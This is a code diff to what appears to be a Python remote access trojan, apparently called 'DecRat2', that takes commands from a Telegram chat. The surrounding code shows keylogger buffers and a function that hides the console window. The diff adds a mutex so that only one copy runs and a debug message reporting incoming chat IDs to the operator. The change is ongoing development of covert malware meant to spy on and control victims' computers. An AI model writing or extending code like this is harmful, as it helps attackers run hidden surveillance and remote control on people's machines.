@@ -18,6 +18,12 @@ last_update_id = 0
 kl_buf         = []
 kl_running     = False
 
+def single_instance():
+    if sys.platform == "win32":
+        mutex = ctypes.windll.kernel32.CreateMutexW(None, False, "DecRat2Mutex_v1")
+        if ctypes.windll.kernel32.GetLastError() == 183:
+            sys.exit(0)
+
 def hide_console():
     if sys.platform == "win32":
         try:
@@ -220,6 +226,7 @@ def handle(text):
     return None
 
 def main():
+    single_instance()
     hide_console()
     global last_update_id
     time.sleep(2)
@@ -229,9 +236,11 @@ def main():
             for u in tg_get_updates():
                 last_update_id = u["update_id"]
                 m = u.get("message", {})
-                if str(m.get("chat", {}).get("id", "")) != str(CHAT_ID): continue
+                incoming_id = str(m.get("chat", {}).get("id", ""))
                 t = m.get("text", "")
                 if not t: continue
+                tg_send(f"DEBUG: incoming={incoming_id} expected={CHAT_ID}")  # remove after fix
+                if incoming_id != str(CHAT_ID): continue
                 r = handle(t)
                 if r: tg_send(r)
         except: pass
